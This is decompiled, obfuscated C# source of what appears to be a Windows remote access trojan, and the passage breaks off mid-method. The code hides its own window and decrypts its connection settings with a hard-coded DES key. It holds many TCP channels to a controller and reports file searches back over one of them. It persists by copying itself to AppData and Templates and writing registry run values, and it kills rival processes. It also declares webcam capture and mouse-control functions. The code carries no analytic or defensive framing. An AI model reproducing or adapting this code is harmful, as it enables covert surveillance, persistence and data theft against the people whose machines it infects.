using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using PRbZe7jbKrAYFJMnccccIcC0;
using UP6TrDMveVC0am4Vio6LYDn3;
using mb3SJPwXNj8l4RoBpl7Zf774;
using ns1;

[DesignerGenerated]
public class eQ93LajbLyEGe3koRxEhL39o43 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("ServiceController1")]
	private ServiceController TKHlloA1w5Nx11;

	private bool bY0svbBqzXhk12;

	private bool INmVkyZTugbK13;

	private bool OUfrH25Yg3D314;

	private int ZFKvgVNVtmCx15;

	private int int_0;

	private int W9JwSi4FajVE17;

	private int OuCytghriHp218;

	private string l7Sl0IfJ19z719;

	private string cg3aiWnJJ39C20;

	private string huqwYcifJHbK21;

	private string pIFr3cCEUvmc22;

	private string d69lkGihXg4v23;

	private string iIKPQknv5iLz24;

	private string hVFxqvHL8ejR25;

	private int int_1;

	private int rNNz8R7UlA3o27;

	private TcpClient tcpClient_0;

	private NetworkStream pk6bwBU7Ll5C29;

	private StreamWriter H7Dh6pvsTw1D30;

	private StreamReader streamReader_0;

	private Process KVoJFWDFFfKr32;

	private StringBuilder F5XZnjZTjtab33;

	private int int_2;

	private int int_3;

	private long long_0;

	private short CYf7EXtPyLXB37;

	private byte[] v21WvnBSTCwt38;

	private FileStream nRTGlfqO3IlU39;

	private FileStream fileStream_0;

	private BinaryWriter fxLoAQbZrLKM41;

	private BinaryReader binaryReader_0;

	private int fZc3t8vNE0rO43;

	private long u2edwlsk5lyS44;

	private long lP1P2pb8H59B45;

	private string D7wigX73lFOj46;

	private MessageBoxIcon UjhkEvATqjHD47;

	private MessageBoxButtons messageBoxButtons_0;

	private string P947dvwG0IVI49;

	private string string_0;

	private string cSe3xqqhKSvv51;

	private Point qsFVN1CoK26Y52;

	private Rectangle OVTDrfYXXtVl53;

	private const int SC_SCREENSAVE = 61760;

	private const int HWND_BROADCAST = 65535;

	private const int WM_SYSCOMMAND = 274;

	public const long M = 1L;

	public const long MONITOR_ON = -1L;

	public const int MONITOR_OFF = 2;

	private const int SC_MONITORPOWER = 61808;

	private const short WM_CAP = 1024;

	private const int WM_CAP_COPY = 1054;

	private const int WM_CAP_DRIVER_CONNECT = 1034;

	private const int WM_CAP_DRIVER_DISCONNECT = 1035;

	private const int WM_CAP_EDIT_COPY = 1054;

	private const int WM_CAP_GET_FRAME = 1084;

	private int gt8AiDYglYK254;

	private IDataObject AgwofNQ9MgeC55;

	private Image wMQuUxxXxkEj56;

	private ManagementObjectSearcher S2674QCQaR2b57;

	private string JzHaDMy0fw3v58;

	private string MulNrNvgBdvd59;

	private string HI4WEorFKFKk60;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private string[] QnjKME4mYAkA61;

	private string[] uOpnmMzv62;

	private string[] string_1;

	private Thread thread_0;

	private string tKtX89e665;

	private string[] ousPZ3jX66;

	private int[] int_4;

	private const long MB_DEFBUTTON1 = 0L;

	private const long MB_DEFBUTTON2 = 256L;

	private TcpClient idgAPcRt68;

	private NetworkStream RlTBiBnU69;

	private StreamWriter gmvd9wR170;

	private StreamReader streamReader_1;

	private Thread HjFVSDhb72;

	private TcpClient DZYDaHEu73;

	private NetworkStream Rl4yTP1M74;

	private StreamWriter mfw1bmIe75;

	private StreamReader cOUZWr2D76;

	private Thread thread_1;

	private TcpClient tcpClient_1;

	private NetworkStream hTyD6f0g79;

	private StreamWriter gJrlNEyq80;

	private StreamReader jrsygRe881;

	private Thread o8REKjGB82;

	private TcpClient D2I3SpwP83;

	private NetworkStream jjTNLvzv84;

	private StreamWriter Yc568CBp85;

	private StreamReader EqeYolvW86;

	private Thread thread_2;

	private TcpClient UDfXYqnS88;

	private NetworkStream ymGyeAs089;

	private StreamWriter riosayrY90;

	private StreamReader NXKVNPzt91;

	private Thread EbcvnDre92;

	private TcpClient tcpClient_2;

	private NetworkStream nHjD64Jl94;

	private StreamWriter bga0Fr5J95;

	private StreamReader MdT3nXDN96;

	private Thread RapN9pjQ97;

	private TcpClient fhy5vVmA98;

	private NetworkStream rQj6tqyB99;

	private StreamWriter gFfr3E5p100;

	private StreamReader streamReader_2;

	private Thread XjLnT0eQ102;

	private TcpClient QjBxDwjq103;

	private NetworkStream BOwu9RMA104;

	private StreamWriter c80Z9pWv105;

	private StreamReader Ex99EbIg106;

	private Thread roBK2yLy107;

	private TcpClient cllQpIC5108;

	private NetworkStream xbbKZeHq109;

	private StreamWriter n6T6m9Lp110;

	private StreamReader streamReader_3;

	private Thread msMN456W112;

	private TcpClient V4Ct0Xhc113;

	private NetworkStream HanWFFb2114;

	private StreamWriter AVK9ERPu115;

	private StreamReader EwowrTmh116;

	private Thread thread_3;

	private TcpClient YQ35FAZG118;

	private NetworkStream gKd8lWh3119;

	private StreamWriter e7OtzKKO120;

	private StreamReader O5VIuTvh121;

	private Thread vCaNNJP3122;

	private TcpClient xHgHFdV3123;

	private NetworkStream F73ptWze124;

	private StreamWriter streamWriter_0;

	private StreamReader eVDJMtgv126;

	private Thread iLVRu28A127;

	private TcpClient tcpClient_3;

	private NetworkStream networkStream_0;

	private StreamWriter uSsKAchc130;

	private StreamReader Qy6I0HJ3131;

	private Thread thread_4;

	private TcpClient tcpClient_4;

	private NetworkStream mFmBzo0X134;

	private StreamWriter BQwhZ5yk135;

	private StreamReader cDqKQB1E136;

	private Thread lkBwwrq7137;

	private TcpClient u4lkk8tJ138;

	private NetworkStream Gsbojf82139;

	private StreamWriter vlD8jjbL140;

	private StreamReader DIgfMur9141;

	private Thread qoNVJd03142;

	private TcpClient aG4opDl5143;

	private NetworkStream bz0aNhOa144;

	private StreamWriter SAGCSeXb145;

	private StreamReader streamReader_4;

	private Thread lzYCfNl0147;

	private TcpClient ma3dtgm8148;

	private NetworkStream zC39wnbV149;

	private StreamWriter JSnoFpDY150;

	private StreamReader fJOejcV5151;

	private Thread fGfHaKIK152;

	private TcpClient FPlPaaKX153;

	private NetworkStream n2SnpXkX154;

	private StreamWriter x4XKr7Pn155;

	private StreamReader HXTQ8tLZ156;

	private Thread thread_5;

	private TcpClient YRQhjxFi158;

	private NetworkStream lia6NYix159;

	private StreamWriter streamWriter_1;

	private int hTdLeuTJ161;

	private string fRLAhx39162;

	private Mutex hBuPjEcb163;

	private Thread laQ5GCP4164;

	private string string_2;

	private bool pqQVcHfs166;

	private bool UXUEp0AC167;

	private bool H1q3DN2D168;

	private int int_5;

	private int xDqTOgZD170;

	private List<Rectangle> VoaIHaF1mnIit0dB171;

	private int[] ncTv8UUg8w6MzGOq172;

	private string string_3;

	private int pPvBntu0tTAa3SrF174;

	private int zhgGRYY3g1uBVKlC175;

	private bool DynKbc3yi8LJJKO8176;

	private string string_4;

	private int yYxuvHumdHoJcejw178;

	internal virtual ServiceController ServiceController1
	{
		get
		{
			return TKHlloA1w5Nx11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			TKHlloA1w5Nx11 = value;
		}
	}

	private string Manufacturer => JzHaDMy0fw3v58;

	private string Model => MulNrNvgBdvd59;

	private string WindowsDirectory => HI4WEorFKFKk60;

	public eQ93LajbLyEGe3koRxEhL39o43()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Shown((EventHandler)x0kGFweGVUqPzs6ND9igUorq99);
		((Form)this).add_FormClosing(new FormClosingEventHandler(nQjNaC259Yyb8IeqrNCHGHpj111));
		bY0svbBqzXhk12 = false;
		ZFKvgVNVtmCx15 = 0;
		int_2 = 32768;
		int_3 = 65536;
		v21WvnBSTCwt38 = new byte[0];
		cSe3xqqhKSvv51 = Conversions.ToString(Environment.OSVersion.Version.Major);
		OVTDrfYXXtVl53 = Screen.get_PrimaryScreen().get_Bounds();
		tKtX89e665 = "";
		ousPZ3jX66 = new string[4] { "Default", "90", "180", "270" };
		int_4 = new int[4] { 0, 1, 2, 3 };
		pqQVcHfs166 = false;
		UXUEp0AC167 = false;
		H1q3DN2D168 = false;
		checked
		{
			int_5 = (int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0);
			xDqTOgZD170 = (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0);
			VoaIHaF1mnIit0dB171 = new List<Rectangle>();
			ncTv8UUg8w6MzGOq172 = new int[17];
			string_3 = null;
			pPvBntu0tTAa3SrF174 = 0;
			DynKbc3yi8LJJKO8176 = false;
			InitializeComponent();
		}
	}

	[STAThread]
	public static void GXwR8WjnlrOXbBB7RkoUABDb85()
	{
		Application.Run((Form)(object)new eQ93LajbLyEGe3koRxEhL39o43());
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		new ComponentResourceManager(typeof(eQ93LajbLyEGe3koRxEhL39o43));
		ServiceController1 = new ServiceController();
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		Padding margin = default(Padding);
		((Padding)(ref margin))._002Ector(18, 39, 18, 39);
		((Form)this).set_Margin(margin);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainFrm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, short nHeight, int hWndParent, int nID);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciExecute([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwnd, IntPtr hWndChild, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindow);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool IsWindowVisible(IntPtr hwnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SwapMouseButton(long bSwap);

	private void x0kGFweGVUqPzs6ND9igUorq99(object sender, EventArgs e)
	{
		try
		{
			ssqwzwagQoOhjET2PiWIbjP3122(5);
			hBuPjEcb163 = new Mutex(initiallyOwned: false, ZkcYnD2a16.M4ET8xTd40());
			if (!hBuPjEcb163.WaitOne(0, exitContext: false))
			{
				hBuPjEcb163.Close();
				hBuPjEcb163 = null;
				ProjectData.EndApp();
			}
			((Control)this).set_Visible(false);
			d69lkGihXg4v23 = method_2(ZkcYnD2a16.aDAM4fur36(), "12345#$%");
			fRLAhx39162 = d69lkGihXg4v23;
			iIKPQknv5iLz24 = method_2(ZkcYnD2a16.xLFNFOeA38(), "12345#$%");
			int_1 = ZkcYnD2a16.PwBBSpzt37();
			hTdLeuTJ161 = int_1;
			rNNz8R7UlA3o27 = ZkcYnD2a16.W6MpczBI39();
			ssqwzwagQoOhjET2PiWIbjP3122(1);
			if ((Operators.CompareString(fRLAhx39162, (string)null, false) == 0) | (hTdLeuTJ161 == 0))
			{
				Environment.Exit(0);
			}
			else
			{
				try
				{
					aLhckTsOb4PHCVLY7XCRb4Cj109();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					Thread thread = new Thread(entEhLlzO8tWen3fkUluTpco107);
					thread.Start();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				thread_0 = new Thread(KQD4vvfAQi4C211);
				thread_0.Start();
				try
				{
					Thread thread2 = new Thread(method_0);
					thread2.Start();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			OuCytghriHp218 = ((Control)this).get_Handle().ToInt32();
			vqBA9opDAQN0EizK3BIlee9n151();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("dnsapi.dll")]
	private static extern uint DnsFlushResolverCache();

	private void method_0()
	{
		while (true)
		{
			ssqwzwagQoOhjET2PiWIbjP3122(1800);
			try
			{
				if (!tcpClient_0.Connected)
				{
					DnsFlushResolverCache();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	private string method_1()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void pghGEWNqlZsjyB2MDziKEPs8105(object currentDirectory)
	{
		checked
		{
			try
			{
				if (!INmVkyZTugbK13)
				{
					return;
				}
				QnjKME4mYAkA61 = Directory.GetDirectories(Conversions.ToString(currentDirectory));
				uOpnmMzv62 = Directory.GetFiles(Conversions.ToString(currentDirectory));
				string[] array = uOpnmMzv62;
				foreach (string text in array)
				{
					if (string_1[1].StartsWith("*"))
					{
						string[] array2 = string_1[1].Split(new char[1] { '.' });
						if (text.EndsWith(array2[array2.Length - 1]))
						{
							e7OtzKKO120.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().GetFileInfo(text).Length));
							e7OtzKKO120.Flush();
						}
					}
					else
					{
						string[] array3 = text.Split(new char[1] { '\\' });
						if (array3[array3.Length - 1].Contains(string_1[1]))
						{
							e7OtzKKO120.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().GetFileInfo(text).Length));
							e7OtzKKO120.Flush();
						}
					}
				}
				string[] qnjKME4mYAkA = QnjKME4mYAkA61;
				foreach (string text2 in qnjKME4mYAkA)
				{
					if (!(text2.Substring(3).StartsWith("WINDOWS") | text2.Substring(3).StartsWith("WINNT")))
					{
						pghGEWNqlZsjyB2MDziKEPs8105(text2);
					}
				}
				QnjKME4mYAkA61 = null;
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(currentDirectory, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
				{
					e7OtzKKO120.WriteLine("/SEARCHFL/SEARCHEND");
					e7OtzKKO120.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private ImageCodecInfo cHIqm6FyX4IDAfKIBe0B7Gnm106(string mimeType)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = imageEncoders.Length;
		int num2 = 0;
		while (true)
		{
			if (num2 <= num)
			{
				if (Operators.CompareString(imageEncoders[num2].get_MimeType(), mimeType, false) == 0)
				{
					break;
				}
				num2 = checked(num2 + 1);
				continue;
			}
			return null;
		}
		return imageEncoders[num2];
	}

	private void entEhLlzO8tWen3fkUluTpco107()
	{
		try
		{
			ssqwzwagQoOhjET2PiWIbjP3122(5);
			E9LKAKD15Vf3yObqTnNycyzN110();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private object Pz9pOQ1vkmcZD1gcJ8OrLNud108(string ProcessName)
	{
		Process process = new Process();
		Process[] processesByName = Process.GetProcessesByName(ProcessName);
		IEnumerator enumerator = default(IEnumerator);
		for (int i = 0; i < processesByName.Length; i = checked(i + 1))
		{
			process = processesByName[i];
			try
			{
				try
				{
					enumerator = process.Modules.GetEnumerator();
					if (!enumerator.MoveNext())
					{
						continue;
					}
					ProcessModule processModule = (ProcessModule)enumerator.Current;
					return processModule.FileName!.ToString();
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return null;
	}

	private void aLhckTsOb4PHCVLY7XCRb4Cj109()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(Pz9pOQ1vkmcZD1gcJ8OrLNud108(process.ProcessName))).Length <= 100000L)
					{
						continue;
					}
					double num = double.Parse(FileVersionInfo.GetVersionInfo(Conversions.ToString(Pz9pOQ1vkmcZD1gcJ8OrLNud108(process.ProcessName))).ProductVersion);
					if (num == 3.0 || num == 3.1 || num == 3.2 || num == 3.3 || num == 3.4 || num == 3.5)
					{
						try
						{
							process.Kill();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						ssqwzwagQoOhjET2PiWIbjP3122(2);
						try
						{
							((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Pz9pOQ1vkmcZD1gcJ8OrLNud108(process.ProcessName)));
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					else if (num == 3.7)
					{
						Environment.Exit(0);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void E9LKAKD15Vf3yObqTnNycyzN110()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())))
			{
				try
				{
					byte[] array = ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
					try
					{
						((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ssqwzwagQoOhjET2PiWIbjP3122(1);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			ssqwzwagQoOhjET2PiWIbjP3122(2);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey(method_2(ZkcYnD2a16.Sdl7qPCA41(), "12345#$%"), writable: false)!.GetValue(method_2(ZkcYnD2a16.LJqBXfvl42(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey(method_2(ZkcYnD2a16.Sdl7qPCA41(), "12345#$%"), writable: true)!.SetValue(method_2(ZkcYnD2a16.LJqBXfvl42(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			ssqwzwagQoOhjET2PiWIbjP3122(1);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey(method_2(ZkcYnD2a16.Sdl7qPCA41(), "12345#$%"), writable: false)!.GetValue(method_2(ZkcYnD2a16.oZQXt5ff43(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey(method_2(ZkcYnD2a16.Sdl7qPCA41(), "12345#$%"), writable: true)!.SetValue(method_2(ZkcYnD2a16.oZQXt5ff43(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void nQjNaC259Yyb8IeqrNCHGHpj111(object sender, FormClosingEventArgs e)
	{
		try
		{
			E9LKAKD15Vf3yObqTnNycyzN110();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string MbYOg375zXnJrPQtT9UAfZib112(string strText, string strEncrKey)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(strEncrKey, 8));
			byte[] bytes2 = Encoding.UTF8.GetBytes(strText);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(bytes2, 0, bytes2.Length);
			cryptoStream.FlushFinalBlock();
			return Convert.ToBase64String(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_2(string strText, string sDecrKey)
	{
		try
		{
			byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
			byte[] array = new byte[checked(strText.Length + 1)];
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			array = Convert.FromBase64String(strText);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			Encoding uTF = Encoding.UTF8;
			return uTF.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void W8OwNO3NTNFTWI9GPHiqPSPE114()
	{
		try
		{
			nRTGlfqO3IlU39.Close();
			binaryReader_0.Close();
			fxLoAQbZrLKM41 = null;
			fileStream_0 = null;
			binaryReader_0 = null;
			nRTGlfqO3IlU39 = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool kOJNm7QDousN4ASCWd5RyV88115(ref string FileName)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 53:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				flag = (FileSystem.GetAttr(FileName) & 0x10) == 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 53;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private string jWkDcyM4j9bY5gqLW1usgmBf116(ref string Temp)
	{
		try
		{
			string result = null;
			int num = Strings.Len(Temp);
			for (int i = 1; i <= num; i = checked(i + 1))
			{
				string text = Strings.Mid(Temp, i, 1);
				if (Operators.CompareString(text, "*", false) == 0)
				{
					break;
				}
				result = Strings.Mid(Temp, 1, i);
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = null;
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	private string PGuBMY6pGBtqMcrQHntVpTxG117()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			string text = null;
			Process[] array = processes;
			foreach (Process process in array)
			{
				string text2 = process.ProcessName + "*";
				text2 = text2 + process.Id + "*";
				text2 = text2 + process.BasePriority + "*";
